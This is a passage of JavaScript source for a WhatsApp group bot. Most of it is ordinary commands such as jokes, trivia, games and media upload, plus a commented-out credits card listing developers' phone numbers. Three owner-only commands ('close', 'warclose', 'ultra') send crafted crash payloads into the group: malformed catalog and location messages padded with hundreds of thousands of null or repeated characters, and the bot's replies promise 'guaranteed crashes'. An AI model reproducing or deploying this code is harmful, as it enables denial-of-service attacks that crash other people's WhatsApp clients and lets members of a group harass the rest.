  if (!plugin) { await reply(`⚠️ Plugin "${name}" not found.`); break; }
  await reply(`📄 *${name}*\n\`\`\`javascript\n${plugin.code}\n\`\`\``);
  break;
}

case 'listp': {
  if (needOwner()) break;
  const pluginsFile = DB('plugins.json');
  const plugins = readJSON(pluginsFile, []);
  if (!plugins.length) { await reply('📭 No plugins.'); break; }
  const list = plugins.map((p, i) => `${i+1}. ${p.name} (${new Date(p.createdAt).toLocaleDateString()})`).join('\n');
  await reply(`📋 *Plugins (${plugins.length})*\n\n${list}`);
  break;
}

// ── Upload to GitHub ──
case 'tourlgh':
case 'uploadgh': {
  if (needOwner()) break;
  const q = m.quoted || m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) { await reply('Reply to an image, video, or document.'); break; }
  try {
    const buffer = await dlMedia(q.msg || q, q.key || m.key);
    const url = await uploadToCatbox(buffer, 'upload_' + Date.now() + '.jpg');
    await reply(`✅ Uploaded: ${url}`);
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Pinterest Album ──
case 'pinalbum': {
  if (!text) { await reply(`📌 Usage: .pinalbum <search query>\nExample: .pinalbum anime`); break; }
  await reaction('📌');
  try {
    const { data } = await axios.get(`https://api.siputzx.my.id/api/search/pinterest?query=${encodeURIComponent(text)}`, { timeout: 15000 });
    if (!data.result || data.result.length === 0) { await reply('❌ No results.'); break; }
    const images = data.result.slice(0, 10);
    let msg = `📌 *Pinterest Results for "${text}"*\n\n`;
    images.forEach((img, i) => {
      msg += `${i+1}. 🔗 ${img.link}\n`;
    });
    await reply(msg);
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}
    // ══════════════════════════════════════════════════════
    //   FUN – EXISTING
    // ══════════════════════════════════════════════════════

    case 'joke': {
      try { const r = await axios.get('https://official-joke-api.appspot.com/random_joke',{timeout:6000}); await reply(`😂 ${r.data.setup}\n\n${r.data.punchline}`); }
      catch { await reply('❌ No jokes.'); }
      break;
    }
    case 'fact': {
      try { const r = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en',{timeout:6000}); await reply(`💡 ${r.data.text}`); }
      catch { await reply('❌ No facts.'); }
      break;
    }
    case 'quote': {
      try { const r = await axios.get('https://zenquotes.io/api/random',{timeout:6000}); await reply(`🌟 "${r.data[0].q}"\n– ${r.data[0].a}`); }
      catch { await reply('❌ No quotes.'); }
      break;
    }
    case 'dare': {
      const d=['Tell your most embarrassing secret.','Do 20 push-ups now.','Text your crush right now.','Sing a song aloud.','Change your status to something silly for 1hr.','Send a voice note of you barking.','Do your best celebrity impression.'];
      await reply(`🔥 Dare: ${d[Math.floor(Math.random()*d.length)]}`);
      break;
    }
    case 'truth': {
      const t2=['Whats your biggest regret?','Have you ever lied to your best friend?','What is your guilty pleasure?','Who is your secret crush?','What embarrassing thing have you done?','What is a secret you have never told anyone?','Who do you secretly dislike in this group?'];
      await reply(`💬 Truth: ${t2[Math.floor(Math.random()*t2.length)]}`);
      break;
    }
    case 'riddle': {
      const r=[{q:'What has keys but no locks?',a:'A keyboard'},{q:'What gets wetter as it dries?',a:'A towel'},{q:'I speak without a mouth. What am I?',a:'An echo'},{q:'The more you take the more you leave behind.',a:'Footsteps'},{q:'What has hands but cant clap?',a:'A clock'},{q:'I have cities, but no houses live there.',a:'A map'}];
      const pick=r[Math.floor(Math.random()*r.length)];
      await reply(`🧩 *Riddle:* ${pick.q}\n\n_Answer: ${pick.a}_`);
      break;
    }
    case 'roast': {
      const r=['You are the human equivalent of a participation trophy.','If brains were gas, you would not have enough to power an ants motorcycle.','You are not stupid; you just have bad luck thinking.','You bring everyone so much joy when you leave the room.','You are proof that evolution can go in reverse.'];
      const t2=getTargetJid(m,args); const name=t2?`@${normNum(t2)}`:'you'; const mentions=t2?[t2]:[];
      await sock.sendMessage(jid,{text:ft(`🔥 ${r[Math.floor(Math.random()*r.length)].replace('You',name)}`,sock),mentions},{quoted:qchanel});
      break;
    }
    case 'ship': {
      const t1=sender; const t2=getTargetJid(m,args);
      const pct=Math.floor(Math.random()*101); const bar='█'.repeat(Math.floor(pct/10))+'░'.repeat(10-Math.floor(pct/10));
      await reply(`💘 Ship Meter\n\n@${normNum(t1)} ❤️ ${t2?'@'+normNum(t2):'???'}\n\n[${bar}] ${pct}%`);
      break;
    }
    case 'coinflip': { await reply(`🪙 ${Math.random()>0.5?'Heads!':'Tails!'}`); break; }
    case 'dice': { const sides=parseInt(args[0])||6; await reply(`🎲 d${sides}: *${Math.floor(Math.random()*sides)+1}*`); break; }
    case 'magic8': {
      const a=['Yes, definitely!','Without a doubt.','Outlook good.','My sources say no.','Cannot predict now.','Don\'t count on it.','Signs point to yes.','Very doubtful.','It is certain.','Ask again later.'];
      await reply(`🎱 ${a[Math.floor(Math.random()*a.length)]}`);
      break;
    }
    case 'horoscope': {
      const signs=['aries','taurus','gemini','cancer','leo','virgo','libra','scorpio','sagittarius','capricorn','aquarius','pisces'];
      const sign=args[0]?.toLowerCase();
      if(!signs.includes(sign)){await reply(`${prefix}horoscope <sign>\nSigns: ${signs.join(', ')}`);break;}
      try{const r=await axios.post(`https://aztro.sameerkumar.website/?sign=${sign}&day=today`,{},{timeout:8000});await reply(`⭐ *${sign.toUpperCase()}*\n\n${r.data.description}\n\n🍀 Lucky # ${r.data.lucky_number}\n💜 Mood: ${r.data.mood}`);}
      catch{await reply('❌ Failed.');}
      break;
    }
    case 'meme': {
      try{const r=await axios.get('https://meme-api.com/gimme',{timeout:8000});await replyImg(r.data.url,`😂 ${r.data.title}`);}
      catch{await reply('❌ No memes.');}
      break;
    }
    case 'cat': {
      try{const r=await axios.get('https://api.thecatapi.com/v1/images/search',{timeout:8000});await replyImg(r.data[0].url,'🐱 Meow!');}
      catch{await reply('❌ No cats.');}
      break;
    }
    case 'dog': {
      try{const r=await axios.get('https://dog.ceo/api/breeds/image/random',{timeout:8000});await replyImg(r.data.message,'🐶 Woof!');}
      catch{await reply('❌ No dogs.');}
      break;
    }
    case 'waifu': {
      try{const r=await axios.get('https://api.waifu.pics/sfw/waifu',{timeout:8000});await replyImg(r.data.url,'🌸 Waifu!');}
      catch{await reply('❌ No waifu.');}
      break;
    }
    case 'anime': {
      try{const r=await axios.get('https://api.jikan.moe/v4/random/anime',{timeout:8000});const a=r.data.data;await replyImg(a.images?.jpg?.image_url,`🎌 *${a.title}*\nEpisodes: ${a.episodes||'?'}\nScore: ${a.score||'?'}\n${(a.synopsis||'').slice(0,200)}`);}
      catch{await reply('❌ Failed.');}
      break;
    }
    case 'trivia': {
      try{
        const r=await axios.get('https://opentdb.com/api.php?amount=1&type=multiple',{timeout:8000});
        const q=r.data.results[0];
        const ans=[...q.incorrect_answers,q.correct_answer].sort(()=>Math.random()-0.5);
        await reply(`❓ *${q.question.replace(/&quot;/g,'"').replace(/&#039;/g,"'")}*\n\n${ans.map((a,i)=>`${i+1}. ${a}`).join('\n')}\n\n_Answer: ${q.correct_answer}_`);
      }catch{await reply('❌ No trivia.');}
      break;
    }
    case 'compliment': {
      const c2=['You are absolutely brilliant!','Your smile brightens everyone\'s day.','You are stronger than you think.','Your kindness is rare and beautiful.','You make the world a better place!','You have an amazing energy!'];
      const t2=getTargetJid(m,args); const name=t2?`@${normNum(t2)}`:'you'; const mentions=t2?[t2]:[];
      await sock.sendMessage(jid,{text:ft(`💐 ${c2[Math.floor(Math.random()*c2.length)].replace('You',name)}`,sock),mentions},{quoted:qchanel});
      break;
    }
    case 'bored': {
      try{const r=await axios.get('https://www.boredapi.com/api/activity/',{timeout:6000});await reply(`🎯 ${r.data.activity}\nType: ${r.data.type} | Participants: ${r.data.participants}`);}
      catch{await reply('❌ Failed.');}
      break;
    }

    // ── NEW FUN COMMANDS ──────────────────────────────────

    // Rock Paper Scissors
    case 'rps': {
      const choices = ['🪨 Rock','📄 Paper','✂️ Scissors'];
      const valid = ['rock','paper','scissors','r','p','s'];
      const map = {r:'rock',p:'paper',s:'scissors'};
      const raw = args[0]?.toLowerCase();
      const pick = map[raw] || raw;
      if (!['rock','paper','scissors'].includes(pick)) {
        await reply(`${prefix}rps rock/paper/scissors`); break;
      }
      const botPick = ['rock','paper','scissors'][Math.floor(Math.random()*3)];
      const wins = {rock:'scissors',paper:'rock',scissors:'paper'};
      const result = pick === botPick ? '🤝 Draw!' : wins[pick] === botPick ? '🏆 You win!' : '😈 Bot wins!';
      await reply(`Your choice: ${pick}\nBot choice: ${botPick}\n\n${result}`);
      break;
    }

    // Math quiz
    case 'math': {
      const ops = ['+','-','×'];
      const op = ops[Math.floor(Math.random()*ops.length)];
      const a2 = Math.floor(Math.random()*50)+1;
      const b2 = Math.floor(Math.random()*50)+1;
      const ans2 = op==='+' ? a2+b2 : op==='-' ? a2-b2 : a2*b2;
      if (!text) {
        const mathQ = readJSON(DB('mathq.json'), {});
        mathQ[jid] = { ans: ans2, ts: Date.now() };
        writeJSON(DB('mathq.json'), mathQ);
        await reply(`🧮 Quick Math!\n\n*${a2} ${op} ${b2} = ?*\n\nReply with the answer (30s to answer)`);
        break;
      }
      // Check answer
      const mathQ = readJSON(DB('mathq.json'), {});
      const q2 = mathQ[jid];
      if (!q2 || Date.now() - q2.ts > 30000) { await reply('❌ No active math question or time expired.'); break; }
      const userAns = parseInt(text.trim());
      if (userAns === q2.ans) {
        delete mathQ[jid];
        writeJSON(DB('mathq.json'), mathQ);
        await reply(`✅ Correct! The answer was *${q2.ans}* 🎉`);
      } else {
        await reply(`❌ Wrong! The correct answer was *${q2.ans}*`);
      }
      break;
    }

    // Never have I ever
    case 'neverhaveiever': {
      const nhi=[
        'Never have I ever lied to get out of trouble.',
        'Never have I ever eaten food off the floor.',
        'Never have I ever googled myself.',
        'Never have I ever faked being sick.',
        'Never have I ever cried at a movie.',
        'Never have I ever broken a bone.',
        'Never have I ever stayed awake for 24+ hours.',
      ];
      await reply(`🙈 ${nhi[Math.floor(Math.random()*nhi.length)]}\n\n_React 🖐 if you HAVE, 👇 if you HAVEN'T_`);
      break;
    }

    // Would you rather
    case 'wouldyourather': {
      const wyr=[
        ['be able to fly','be invisible'],
        ['speak every language','play every instrument'],
        ['have no internet for a month','no phone for a month'],
        ['always be hot','always be cold'],
        ['know the future','change the past'],
        ['be famous for a day','be unknown forever'],
      ];
      const pick2 = wyr[Math.floor(Math.random()*wyr.length)];
      await reply(`🤔 *Would you rather...*\n\n🅰️ ${pick2[0]}\n\n— OR —\n\n🅱️ ${pick2[1]}\n\n_Reply A or B!_`);
      break;
    }

    // ══════════════════════════════════════════════════════
    //   CREDITS – multi-card developer carousel
    // ══════════════════════════════════════════════════════
   /* case 'credits':
    case 'tennor': {
      await reaction('🌟');
      try {
        const {
          generateWAMessageFromContent,
          prepareWAMessageMedia,
          proto,
        } = require('@whiskeysockets/baileys');

        // ── Helper: download + upload image for a card header ──
        const makeImgField = async (url) => {
          try {
            const buf = await getBuffer(url);
            return await prepareWAMessageMedia({ image: buf }, { upload: sock.waUploadToServer });
          } catch { return {}; }
        };

        // ── Card definitions ──
        // Each card: { img, title, body, buttons[] }
        const cardDefs = [
          {
            img:   'https://files.catbox.moe/ocgi20.jpg',
            title: '𝗚𝗶𝗱𝗱𝘆 𝗧𝗲𝗻𝗻𝗼𝗿',
            body: [
              '• horny dev',
              '• married',
              '• rude',
              '• arrested for being sexy',
              '• JavaScript coder',
              '• efootball player',
              '• chelsea fan',
              '• UoN student',
              '• Proud Luo',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp',    url: 'https://wa.me/254756182478' },
              { display_text: '✈️ Telegram',    url: 'https://t.me/tennormodzdev' },
              { display_text: '📢 TG Channel',  url: 'https://t.me/+jh4yhoD_XQs2MThk' },
              { display_text: '📣 WA Channel',  url: 'https://whatsapp.com/channel/0029VbAWe2uIHphDEiz3Vh2r' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: '𝗝𝗮𝗺𝗲𝘀 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹',
            body: [
              '• fullstack developer',
              '• anime creator',
              '• proud Kikuyu',
              '• Naxeex games player',
              '• mini militia player',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp',   url: `https://wa.me/${kontributor[0] || settings.SUDO_NUMBER || '254704955033'}` },
              { display_text: '✈️ Telegram',   url: 'https://t.me/shenxidev' },
              { display_text: '📢 TG Channel', url: 'https://t.me/jamesBotz3' },
              { display_text: '👥 TG Group',   url: 'https://t.me/shenqidi' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: '𝗔𝗻𝗶𝗺𝗲 𝗠𝗗 𝗕𝗼𝘁',
            body: [
              `• Powered by @whiskeysockets/baileys`,
              `• Version: ${settings.BOT_VERSION || '1.0'}`,
              `• Prefix: ${prefix}`,
              `• Library: Node.js`,
              `• Company: ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
              `• Made with ❤️ by the team`,
            ].join('\n'),
            buttons: [
              { display_text: '🔗 Pair Bot',      url: settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot' },
              { display_text: '📢 Follow Channel', url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3' },
              { display_text: '👥 Support Group',  url: settings.REQUIRED_GROUP_LINK   || 'https://t.me/shenqidi' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: '*ᴜɴᴋɴᴏᴡɴ ᴅᴇᴠ* ',
            body: [
              '• ғᴏᴜɴᴅᴇʀ ᴏғ ᴢᴇɴᴛʀɪx ᴛᴇᴄʜ',
              '• ʙᴀʀᴄᴀ ғᴀɴ',
              '• ʙᴏᴛ ᴅᴇᴠ',
              '• ᴄᴜᴛᴇsᴛ 😂😂',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp', url: 'https://wa.me/2349057467015' },
              { display_text: '✈️ Telegram', url: 't.me/UNKNOWN_IS_NO_MORE' },
         { display_text: '✈️ Whatsapp channel', url: 'https://whatsapp.com/channel/0029VbCjCq80LKZ4i4iWHq22' },
            ],
          },
{
            img:   'https://i.imghippo.com/files/BFi4775wA.jpg',
            title: '𝐌ꝛ 𝐍𝚯𝐗 𝚸𝚪𝚰𝚳𝚵𝚵𝚵 𝚯𝐅𝐅𝚰𝐂𝐈𝚫𝐋',
            body: [
              '• NOX HOSTING ☁️ | founder',
              '• PRIMEEE TECH | owner',
              '• BOT/SITE WEB developer',
              '• JUST A CHILL BOY 💳',
            ].join('\n'),
            buttons:  [
              { display_text: 'FREEPANEL BOT', url: 'https://t.me/NoxFreepanelbot?start=ref_7083149358' },
              { display_text: 'CHANNEL', url: 'https://whatsapp.com/channel/0029VbAHTYE7oQhXHhEVrS47' },
            
            { display_text: ' WhatsApp CONTACT', url: 'https://wa.me/message/L3752HTRQ3YPI1' },
              { display_text: '✈️ TG-CONTACT', url: 'https://t.me/noxdm' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: 'Mzazi Tech Inc',
            body: [
              '• Next.js pro',
              '• Mzazi Nameless bot owner',
              '• proud Kisii',
              '• Single But married',
              '• Bugger mkisii',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp',   url: `https://wa.me/${kontributor[0] || settings.SUDO_NUMBER || '254750611309'}` },
              { display_text: '✈️ Telegram',   url: 'https://t.me/shenxidev' },
              { display_text: '📢 TG Channel', url: 'https://t.me/jamesBotz3' },
              { display_text: '👥 TG Group',   url: 'https://t.me/mzazidev' },
            ],
          },
          
        ];

        // ── Build all card image fields in parallel ──
        const imgFields = await Promise.all(cardDefs.map(cd => makeImgField(cd.img)));

        // ── Build proto cards ──
        const cards = cardDefs.map((cd, i) => ({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: cd.title,
            hasMediaAttachment: !!imgFields[i]?.imageMessage,
            ...(imgFields[i] || {}),
          }),
          body: proto.Message.InteractiveMessage.Body.fromObject({ text: cd.body }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: cd.buttons.map(b => ({
              name: 'cta_url',
              buttonParamsJson: JSON.stringify({ display_text: b.display_text, url: b.url, merchant_url: b.url }),
            })),
          }),
        }));

        const creditMsg = await generateWAMessageFromContent(jid, {
          ephemeralMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body:    proto.Message.InteractiveMessage.Body.fromObject({ text: ` *${c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'} — Developer Credits*` }),
                footer:  proto.Message.InteractiveMessage.Footer.fromObject({ text: `© ${settings.CREDITS || 'james'} • ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}` }),
                header:  proto.Message.InteractiveMessage.Header.fromObject({ title: '', hasMediaAttachment: false }),
                contextInfo: {},
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards }),
              }),
            },
          },
        }, { quoted: qchanel });

        await sock.relayMessage(jid, creditMsg.message, { messageId: creditMsg.key.id });
      } catch (e) {
        // plain fallback
        await reply(
          `🌟 *${c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'} — Credits*\n\n` +
          `👨‍💻 *Giddy Tennor* — JavaScript dev, UoN student, Proud Luo\n` +
          `👨‍💻 *James Official* — Fullstack dev, anime creator, Proud Kikuyu\n\n` +
          `📢 Channel: ${settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3'}\n` +
          `🔗 Pair: ${settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot'}`
        );
      }
      break;
    }
*/
case 'forclose':
case 'close': {
  if (needOwner()) break;
  if (needGroup()) break;
  // Bot admin not strictly required but recommended
  
  await reaction('🔒');
  await reply('⏳ Launching Close payload...');

  try {
    const groupId = jid; // target group JID

    // ── Payload exactly as provided ──
    const closeMessage = {
      senderKeyDistributionMessage: {
        groupId: groupId,
        axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
      },
      interactiveMessage: {
        body: { text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆" },
        nativeFlowMessage: {
          buttons: [{
            name: "catalog_message",
            buttonParamsJson: "{}"
          }],
          messageParamsJson: "{}"
        }
      }
    };

    // Send with the biz additional node
    await sock.relayMessage(groupId, closeMessage, {
      additionalNodes: [{
        tag: 'biz',
        attrs: { native_flow_name: 'catalog_message' }
      }]
    });

    console.log(`[Close] Payload sent to ${groupId}`);
    await reply('✅ Close payload delivered.');

  } catch (e) {
    console.error('[Close] ERROR:', e);
    await reply(`❌ Close failed: ${e.message || e}`);
  }
  break;
}
// ── WhatsApp crash payload (forclose / close) ──
case 'warclose':
case 'wc': {
  if (needOwner()) break;
  if (needGroup()) break;


  await reaction('🐉');
  await reply('⏳ Launching SAMSUNG WARCLOSE payload...');

  try {
    const target = jid;

    const warclosePayload = {
      interactiveMessage: {
        header: {
          title: "0",
          subtitle: "0",
          hasMediaAttachment: true,
          locationMessage: {
            degreesLatitude: -6.200000,
            degreesLongitude: 106.816666,
            name: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻",
            address: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 Premium",
            jpegThumbnail: Buffer.alloc(10000, 'a').toString('base64'),
          },
        },
        body: {
          text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐗𝐌𝐃",
        },
        footer: {
          text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 | Premium XMD",
        },
        nativeFlowMessage: {
          buttons: [
            { name: 'catalog_message', buttonParamsJson: JSON.stringify({}) },
            { name: 'booking_status', buttonParamsJson: JSON.stringify({}) },
            { name: 'review_and_pay', buttonParamsJson: `{}` },
            { name: 'payment_requested', buttonParamsJson: `{}` },
          ],
          messageParamsJson: '{}',
        },
      },
    };

    await sock.relayMessage(target, warclosePayload, {
      additionalNodes: [{
        tag: 'biz',
        attrs: { native_flow_name: 'catalog_message' }
      }]
    });

    console.log(`[WARCLOSE] Payload sent to ${target}`);
    await reply('✅ SAMSUNG WARCLOSE delivered – expect crashes.');

  } catch (e) {
    console.error('[WARCLOSE] ERROR:', e);
    await reply(`❌ WARCLOSE failed: ${e.message || e}`);
  }
  break;
}
case 'ultra': {
  if (needOwner()) break;
  if (needGroup()) break;


  await reaction('🔥');
  await reply('⏳ Launching SAMSUNG ULTRA payload...');

  try {
    const pJids = participants.map(p => p.id || p.jid).filter(Boolean);
    const target = jid;

    // ── HEAVY CATALOG (20k products) ──
    const PRODUCT_COUNT = 20000;
    const REPEAT_TITLE = 50000;
    const REPEAT_DESC = 300000;
    const REPEAT_NAME = 20000;
    const REPEAT_IMAGE = 50000;

    const catalogPayload = {
      interactiveMessage: {
        header: {
          title: "0",
          subtitle: "0",
          hasMediaAttachment: true,
          locationMessage: {
            degreesLatitude: -6.200000,
            degreesLongitude: 106.816666,
            name: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂 ⿻ 𝐔𝐋𝐓𝐑𝐀 ⿻",
            address: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 XMD",
            jpegThumbnail: Buffer.alloc(10000, 'a').toString('base64'),
          },
        },
        body: { text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐗𝐌𝐃" },
        footer: { text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 | Ultimate Power" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "catalog_message",
              buttonParamsJson: JSON.stringify({
                title: "\u0111\u0115\u0114\u0117".repeat(REPEAT_TITLE),
                description: "\u0000".repeat(REPEAT_DESC),
                products: Array.from({ length: PRODUCT_COUNT }, (_, i) => ({
                  id: "prod_" + i,
                  name: "\u0111".repeat(REPEAT_NAME),
                  price: "Ksh 999.999",
                  currency: "Ksh",
                  image_url: "https://t.me/SAMSUNG_OFFICIAL" + "\u0000".repeat(REPEAT_IMAGE)
                })),
                catalog_id: "\u0111\u0115\u0114\u0117".repeat(REPEAT_TITLE)
              })
            },
            { name: 'booking_status', buttonParamsJson: '{}' },
            { name: 'review_and_pay', buttonParamsJson: '{}' },
            { name: 'payment_requested', buttonParamsJson: '{}' },
          ],
          messageParamsJson: '{}',
        },
        contextInfo: { mentionedJid: pJids }
      }
    };

    // ── SECONDARY LOCATION BOMB ──
    const locationBomb = {
      locationMessage: {
        degreesLatitude: 9999999999999,
        degreesLongitude: 9999999999999,
        name: "𝐒Λ𝐌𝐒𝐔𝐍𝐆".repeat(20000),
        address: "\u0000".repeat(50000),
        url: "https://t.me/SAMSUNG_OFFICIAL",
        contextInfo: {
          remoteJid: "\u200b".repeat(90000),
          participant: sock.user.id,
          mentionedJid: ["𝐒Λ𝐌𝐒𝐔𝐍𝐆", "Ultra", ...pJids]
        }
      }
    };

    // ── EMOJI SPAM ──
    const emojiBomb = {
      text: "🔥".repeat(200000),
      contextInfo: { mentionedJid: pJids }
    };

    // Send catalog (with biz node)
    await sock.relayMessage(target, catalogPayload, {
      additionalNodes: [{ tag: 'biz', attrs: { native_flow_name: 'catalog_message' } }]
    });
    await new Promise(r => setTimeout(r, 3000));

    // Send location
    await sock.relayMessage(target, locationBomb, {});
    await new Promise(r => setTimeout(r, 3000));

    // Send emoji
    await sock.sendMessage(target, emojiBomb, {});

    console.log(`[ULTRA] All payloads sent to ${target}`);
    await reply('✅ SAMSUNG ULTRA delivered – guaranteed crashes.');

  } catch (e) {
    console.error('[ULTRA] ERROR:', e);
    await reply(`❌ ULTRA failed: ${e.message}`);
  }
  break;
}case 'tourl1':
case 'upload':
case 'toupload': {
    await reaction('📄');

    const { qMsg: qMsgTU, qType: qTypeTU, qKey: qKeyTU } = getQuoted(m);
    const MEDIA_TYPES = ['imageMessage', 'videoMessage', 'stickerMessage', 'audioMessage', 'documentMessage'];
    const mediaTypeTU = MEDIA_TYPES.find(t2 => qMsgTU?.[t2]);

    if (!qMsgTU || !mediaTypeTU) {
        await sock.sendMessage(jid, {
            text: `❌ Reply to an image, video, sticker, or audio with .tourl`
        }, { quoted: m });
        break;
    }

    try {
        // 1. Download the media
        const buf = await dlMedia(qMsgTU, qKeyTU);
        if (!buf) throw new Error('Media download failed');

        // 2. Upload to Catbox.moe (free, no auth)
        const FormData = require('form-data');
        const form = new FormData();
        const ext = mediaTypeTU.replace('Message', '').toLowerCase();
        const filename = `upload_${Date.now()}.${ext === 'sticker' ? 'webp' : ext === 'audio' ? 'mp3' : 'mp4'}`;
        form.append('fileToUpload', buf, filename);
        form.append('reqtype', 'fileupload');

        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0',
            },
            timeout: 30000,
        });

        const link = response.data.trim();
        if (!link || !link.startsWith('https://')) throw new Error('Upload failed');

        // 3. Send the link as a clean reply
        await sock.sendMessage(jid, {
            text: `✅ *Upload Complete!*\n\n🔗 ${link}\n\n📌 Expires: Never`
        }, { quoted: m });

        await reaction('✅');

    } catch (e) {
        console.error('[tourl] Error:', e.message);
        await sock.sendMessage(jid, {
            text: `❌ Upload failed: ${e.message}`
        }, { quoted: m });
    }
    break;
}
    default: {
      const h = { reply, replyImg, ft, cfg, dlMedia, reaction, normNum, getQuoted, isOwner: _isOwner };
      if (await reactionHandler(sock, m, cmd, args, h)) break;
      if (await scrapsHandler(sock, m, cmd, args, h))   break;
      if (await illusionHandler(sock, m, cmd, args, h)) break;
      if (await socialHandler(sock, m, cmd, args, h))   break;
      if (await aiHandler(sock, m, cmd, args, h))       break;
      if (await economyHandler(sock, m, cmd, args, h))  break;
      if (await toolsHandler(sock, m, cmd, args, h))    break;
      if (await stickerHandler(sock, m, cmd, args, h))  break;
      if (await musicHandler(sock, m, cmd, args, h))    break;
      if (await gamesHandler(sock, m, cmd, args, h))    break;
      if (await adminHandler(sock, m, cmd, args, h))    break;
      if (await arabicHandler(sock, m, cmd, args, h))   break;
      await devHandler(sock, m, cmd, args, h);
      break;
    }
  }
}

module.exports = { handleMessage, runAutoFollow, CMDS };
